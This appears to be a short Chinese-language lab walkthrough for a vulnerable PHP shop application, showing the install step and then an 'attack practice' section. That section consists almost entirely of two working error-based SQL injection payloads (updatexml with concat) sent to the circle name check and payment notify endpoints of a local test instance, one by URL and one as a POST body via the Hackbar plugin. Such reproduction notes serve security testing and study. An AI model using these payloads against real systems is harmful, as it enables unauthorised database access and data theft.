# 实战
在浏览器输入
```
http://IP:PORT/install/
```
## 安装

![image]({path}/1.png)

![image]({path}/2.png)

![image]({path}/3.png)

![image]({path}/4.png)

![image]({path}/5.png)




## 攻击实战
在浏览器输入
```
http://192.168.1.170:7777/circle/index.php?op=check_circle_name&name[0]=exp&name[1]=1)%20or%20updatexml(1,concat(0x5c,md5(1)),1)%23--
```
![image]({path}/6.png)

使用火狐的插件hackbar

```
http://192.168.1.170:7777/index.php?act=payment&op=notify
```

```
out_trade_no%5B0%5D=exp&out_trade_no%5B1%5D=%20%201=1%20and%20(updatexml(1,concat(0x3a,(select%20md5(1))),1))
```

![image]({path}/7.png)
